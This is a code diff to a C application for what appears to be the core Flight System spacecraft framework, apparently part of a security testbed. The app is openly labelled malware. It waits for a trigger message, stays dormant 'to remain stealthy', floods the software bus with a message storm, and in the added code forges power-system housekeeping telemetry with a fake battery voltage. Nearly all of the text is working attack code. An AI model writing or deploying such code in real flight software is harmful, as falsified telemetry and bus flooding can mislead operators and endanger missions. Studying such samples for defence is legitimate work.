@@ -2,9 +2,13 @@
 #include "cfe_sb.h"
 #include "cfe_es.h"
 #include "cfe_evs.h"
+#include <string.h>
+#include "generic_eps_msg.h"
+#include "generic_eps_msgids.h" /* GENERIC_EPS_HK_TLM_MID = 0x091A */
 
 #define MALWARE_TRIGGER_MID 0x18F0
 #define BEACON_PING_FC      2
+#define SPOOF_EPS_FC        3
 #define TRIGGER_THRESHOLD   3
 
 /* * MAXIMIZED PAYLOAD:
@@ -21,6 +25,7 @@ void NOISY_APP_Main(void)
 {
     uint32          RunStatus = CFE_ES_RunStatus_APP_RUN;
     NOISY_APP_Pkt_t SpamPacket;
+    GENERIC_EPS_Hk_tlm_t SpoofPkt;
     bool            AttackArmed = false;
     uint32          PingsSeen   = 0;
 
@@ -62,6 +67,17 @@ void NOISY_APP_Main(void)
                         CFE_EVS_SendEvent(2, CFE_EVS_EventType_CRITICAL,
                                           "NOISY_APP: THRESHOLD REACHED. OMNIDIRECTIONAL STORM INITIATED.");
                     }
+                }
+                else if (CFE_SB_MsgIdToValue(RcvMsgId) == MALWARE_TRIGGER_MID && FcnCode == SPOOF_EPS_FC)
+                {
+                    memset(&SpoofPkt, 0, sizeof(SpoofPkt));
+                    CFE_MSG_Init(CFE_MSG_PTR(SpoofPkt.TlmHeader), CFE_SB_ValueToMsgId(GENERIC_EPS_HK_TLM_MID),
+                                 GENERIC_EPS_HK_TLM_LNGTH);
+                    SpoofPkt.DeviceHK.BatteryVoltage = 0xDEAD;
+                    CFE_SB_TimeStampMsg(CFE_MSG_PTR(SpoofPkt.TlmHeader));
+                    CFE_SB_TransmitMsg(CFE_MSG_PTR(SpoofPkt.TlmHeader), false);
+                    CFE_EVS_SendEvent(4, CFE_EVS_EventType_CRITICAL,
+                                      "NOISY_APP: EPS HK SPOOF transmitted (BatteryVoltage=0xDEAD).");
                 }
             }
             OS_TaskDelay(100); /* Yield while dormant to remain stealthy */
